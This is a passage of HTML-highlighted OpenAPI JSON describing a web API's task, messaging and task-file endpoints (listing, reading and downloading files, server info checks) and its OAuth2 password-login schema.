operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                  <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/HTTPValidationError"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Root"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"root__get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/task_newest"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Task Newest"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"task_newest_task_newest_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/task_completed"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Task Completed"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"task_completed_task_completed_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/task_cancelled"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Task Cancelled"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"task_cancelled_task_cancelled_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/message_inbox"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Message Inbox"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"message_inbox_message_inbox_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/message_sent"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Message Sent"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"message_sent_message_sent_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/messageBox"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Messagebox"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"messageBox_messageBox_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/listTaskFiles"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Listtaskfiles"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"listTaskFiles_listTaskFiles_get"</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"path"</span><span class="token punctuation">,</span>            <span class="token property">"in"</span><span class="token operator">:</span> <span class="token string">"query"</span><span class="token punctuation">,</span>            <span class="token property">"required"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>              <span class="token property">"default"</span><span class="token operator">:</span> <span class="token string">"taskfiles"</span><span class="token punctuation">,</span>              <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Path"</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"422"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Validation Error"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                  <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/HTTPValidationError"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/readTaskFile"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Readtaskfile"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"readTaskFile_readTaskFile_get"</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"path"</span><span class="token punctuation">,</span>            <span class="token property">"in"</span><span class="token operator">:</span> <span class="token string">"query"</span><span class="token punctuation">,</span>            <span class="token property">"required"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>              <span class="token property">"default"</span><span class="token operator">:</span> <span class="token string">"taskfiles"</span><span class="token punctuation">,</span>              <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Path"</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"file_name"</span><span class="token punctuation">,</span>            <span class="token property">"in"</span><span class="token operator">:</span> <span class="token string">"query"</span><span class="token punctuation">,</span>            <span class="token property">"required"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>              <span class="token property">"default"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>              <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"File Name"</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"422"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Validation Error"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                  <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/HTTPValidationError"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/downloadTaskFile"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Downloadtaskfile"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"downloadTaskFile_downloadTaskFile_get"</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"url"</span><span class="token punctuation">,</span>            <span class="token property">"in"</span><span class="token operator">:</span> <span class="token string">"query"</span><span class="token punctuation">,</span>            <span class="token property">"required"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>              <span class="token property">"default"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>              <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Url"</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"422"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Validation Error"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                  <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/HTTPValidationError"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/getPhone"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Getphone"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"getPhone_getPhone_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/getServerInfo"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Getip"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"getIP_getServerInfo_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/checkServer"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Checkserver"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"checkServer_checkServer_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"components"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"schemas"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"Body_login_login_post"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"grant_type"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"anyOf"</span><span class="token operator">:</span> <span class="token punctuation">[</span>              <span class="token punctuation">&#123;</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>                <span class="token property">"pattern"</span><span class="token operator">:</span> <span class="token string">"password"</span>              <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>              <span class="token punctuation">&#123;</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"null"</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Grant Type"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"username"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Username"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"password"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Password"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"scope"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Scope"</span><span class="token punctuation">,</span>            <span class="token property">"default"</span><span class="token operator">:</span> <span class="token string">""</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"client_id"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"anyOf"</span><span class="token operator">:</span> <span class="token punctuation">[</span>              <span class="token punctuation">&#123;</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span>              <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>              <span class="token punctuation">&#123;</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"null"</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Client Id"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"client_secret"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"anyOf"</span><span class="token operator">:</span> <span class="token punctuation">[</span>              <span class="token punctuation">&#123;</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span>              <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>              <span class="token punctuation">&#123;</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"null"</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Client Secret"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token 